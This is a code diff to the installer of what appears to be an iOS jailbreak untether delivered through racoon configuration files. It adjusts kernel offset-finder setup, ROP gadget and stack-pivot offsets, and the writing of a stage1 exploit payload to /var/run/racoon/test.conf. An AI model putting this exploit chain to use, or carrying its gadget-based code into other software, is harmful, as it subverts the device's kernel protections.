@@ -3,6 +3,7 @@
 #include <stdint.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <sys/stat.h>
 #include "common.h"
 #include "stage1.h"
 #include "stage2.h"
@@ -17,7 +18,6 @@
 int install(const char *config_path, const char *racoon_path, const char *dyld_cache_path)
 {
 #if J96_11_3_1
-#define KERNEL_CACHE_PATH "/System/Library/Caches/com.apple.kernelcaches/kernelcache"
 	// this basically just initalizes the myoffsets structure. THis is the only part that prevent the jailbreak from working on all devices/versions because the offsetfinders (I think mainly the kernel one) is still broken
 	// so in theory you could also remove all the offsetfinders and just get the symbols by hand
 	// For examples on how they look like, just look at the git history at some point there were no offsetfinders and all of this was hardcoded for a specific device (either ipad mini gen 4 wifi iOS 11.1.2 or 11.3.1)
@@ -28,7 +28,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	// init the kernel offset finder (libjake)
 	jake_img_t kernel_symbols = malloc(sizeof(jake_img));
 
-	if (jake_init_image(kernel_symbols, KERNEL_CACHE_PATH)) {
+	if (jake_init_image(kernel_symbols, "/System/Library/Caches/com.apple.kernelcaches/kernelcache")) {
 		LOG("Patchfinder init failed\n");
 		return -1;
 	}
@@ -81,7 +81,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	myoffsets.is_task = 0x28; // offset of the is_task field
 	
 #else
-    jake_img_t kernel_symbols; // dummy
+	void* kernel_symbols = NULL;
 	offset_struct_t myoffsets;
     // adr @ 0x100067c10
     // ldr @ 0x1000670e0
@@ -106,7 +106,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
     myoffsets.add_x0_gadget = OFF_ADD_X0_GADGET;
     myoffsets.rop_nop = myoffsets.BEAST_GADGET+4*17;
     myoffsets.errno_offset = OFF_ERRNO;
-    myoffsets.mach_msg_offset = OFF_MACH_MSG;
+    myoffsets.mach_msg_offset = OFF_NDR_RECORD;
     
     myoffsets.longjmp = OFF_LONGJMP;
     myoffsets.stack_pivot = OFF_STACK_PIVOT;
@@ -148,7 +148,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	stage2(kernel_symbols,&myoffsets,"/private/etc/racoon/");
 
 	// generate stage 1
-	// TODO: make sure that the directory exists
+	if (mkdir("/var/run/racoon/", 0777) < 0 && errno != EEXIST) return errno;
 	int f = open("/var/run/racoon/test.conf",O_WRONLY | O_CREAT,0644);
 	stage1(f,&myoffsets);
 	close(f);
